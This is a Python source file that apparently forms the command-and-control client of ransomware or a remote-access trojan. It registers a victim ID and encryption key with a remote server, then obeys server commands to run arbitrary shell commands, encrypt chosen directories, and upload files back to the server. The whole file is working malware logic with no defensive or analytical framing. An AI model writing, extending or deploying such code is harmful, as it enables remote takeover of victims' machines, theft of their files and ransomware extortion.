import socket
import json
from command_handler import execute_command
from file_transfer import upload_file
from encryption import encrypt_directory

def send_initial_data(server_ip, port, uuid, key):
    data = json.dumps({"uuid": uuid, "key": key})
    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
        s.connect((server_ip, port))
        s.sendall(data.encode())

def listen_for_commands(server_ip, port):
    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
        s.connect((server_ip, port))
        while True:
            raw = s.recv(4096)
            if not raw:
                break
            try:
                message = json.loads(raw.decode())
                action = message.get("action")

                if action == "EXEC":
                    output = execute_command(message.get("command", ""))
                    response = json.dumps({"action": "RESULT", "output": output})
                    s.sendall(response.encode())

                elif action == "ENCRYPT":
                    path = message.get("path")
                    key = message.get("key")
                    encrypt_directory(path, key)

                elif action == "UPLOAD":
                    path = message.get("path")
                    fname, filedata = upload_file(path)
                    if fname and filedata:
                        response = json.dumps({
                            "action": "UPLOAD_RESULT",
                            "filename": fname,
                            "data": filedata
                        })
                        s.sendall(response.encode())

            except Exception:
                continue
